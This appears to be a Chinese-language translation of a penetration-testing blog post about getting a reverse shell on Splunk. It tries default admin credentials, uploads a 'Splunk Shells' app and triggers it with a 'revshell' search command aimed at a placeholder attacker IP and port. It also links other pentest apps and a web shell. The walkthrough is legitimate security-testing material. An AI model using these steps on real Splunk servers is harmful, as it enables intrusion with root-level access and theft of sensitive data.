## 前言

**每次测试时我都会碰到Splunk。Splunk是一个用于搜索，分析和可视化数据的软件平台。通常，Splunk中都会包含着各种数据，其中一些可能是较为敏感的数据。因此，对于渗透测试人员而言它的价值不言而喻。**

想要获得对Splunk的访问权限，可以通过猜密码或重用之前获取到的密码尝试登录。曾经，我有过使用“ **admin** : **admin** ”或“
**admin** : **changeme** ”登录进入管理控制台的情况。

## Splunk app  

有一个技巧我相信很多人都不知道，就是使用Splunk app来执行python代码。[TBG
Security](https://tbgsecurity.com/)团队开发了一款可用于渗透测试的Splunk
app。该应用早[在2017年就已经推出](https://github.com/TBGSecurity/weaponize_splunk)。尽管如此，我觉得还是很少有人知道这个工具，我觉得它应该受到更多人的关注。

工具的使用非常简单。首先，你只需从Splunk Shells
[GitHub](https://github.com/TBGSecurity/splunk_shells)页面下载其最新版本。

登录Splunk管理控制台后，依次单击“App”栏和“Manage Apps”。

![Manage
Apps](https://image.3001.net/images/20181024/1540339883_5bcfb8ab3ff86.png!small)

进入Apps面板后，单击“Install app from file”。

![Install app from
file](https://image.3001.net/images/20181024/1540339901_5bcfb8bd79013.png!small)

单击browse按钮并上传tar.gz文件。

![上传tar.gz文件](https://image.3001.net/images/20181024/1540339915_5bcfb8cb80b6b.png!small)

应用成功上传后，必须重启Splunk。重启后登录Splunk，并返回到“Apps”界面。单击permissions，当你看到“Sharing”选项时，单击“All
Apps”单选按钮。

![单击“All
Apps”单选按钮](https://image.3001.net/images/20181024/1540339929_5bcfb8d9d502f.png!small)

安装app后，最后要做的就是获取shell。这里会有一些选项，我选择的是通过Metasploit创建的标准反向shell。

![标准反向shell](https://image.3001.net/images/20181024/1540339945_5bcfb8e90d574.png!small)

MSF handler（或netcat listener）启动并运行后，键入以下命令触发app：

    
    
    | revshell SHELLTYPE ATTACKERIP ATTACKERPORT

![获取到一个反向shell。](https://image.3001.net/images/20181024/1540339964_5bcfb8fc4b09d.png!small)

这将立即执行app，并获取到一个反向shell。

以上测试是在Splunk
7.0上进行的，一切都非常的顺利！Splunk通常以root身份运行，这为攻击者提供了枚举主机其他信息的机会，而不仅仅是局限在数据库范围。

 **更新：**

除了以上方法，你还可以使用Tevora的[splunk_pentest_app](https://github.com/tevora-threat/splunk_pentest_app)，更多内容可以[参阅他们发布的文章](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/)。

 **再次更新（10/20/2018）：**

我发现了一个可用的Splunk web shell：<https://github.com/f8al/TA-Shell>。

 ***参考来源：[n00py](https://www.n00py.io/2018/10/popping-shells-on-splunk/)，FB小编secist编译，转载请注明来自FreeBuf.COM**

